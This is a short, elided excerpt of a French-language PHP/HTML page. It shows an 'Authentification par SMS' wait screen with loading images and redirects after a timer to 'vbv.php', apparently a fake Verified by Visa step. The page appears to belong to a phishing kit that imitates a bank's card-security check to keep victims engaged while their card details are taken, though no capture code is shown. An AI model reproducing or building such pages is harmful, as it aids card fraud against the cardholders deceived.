...
?>
    ...
    <html dir="ltr">
        <head>
            <title>Envoi de sms en cours...</title>
...
<?php
header('Refresh: '.$timer.'; URL=vbv.php');
?>
...
<body style="background-color:#FFFFFF;">
      ...
      <fieldset>
<P>&nbsp;</P>  
<P style="FONT-SIZE: 22px; TEXT-ALIGN: center" align=center><FONT face=Arial>Authentification par SMS<BR></P></FONT>
<P align=center><IMG style="WIDTH: 15%" src="https://i2.wp.com/cookie.domicilenet.fr/uploads/2015/12/pointsiphone.gif"></P>
<P align=center></P>
	<br>
	<P style="FONT-SIZE: 17px; TEXT-ALIGN: center" align=center><FONT face=Arial>Veuillez patienter quelques secondes pendant que nous traitons votre demande<BR></P></FONT>
<P align=center><IMG style="WIDTH: 50%" src="../img/tourne.gif"></P>
<P align=center></P>
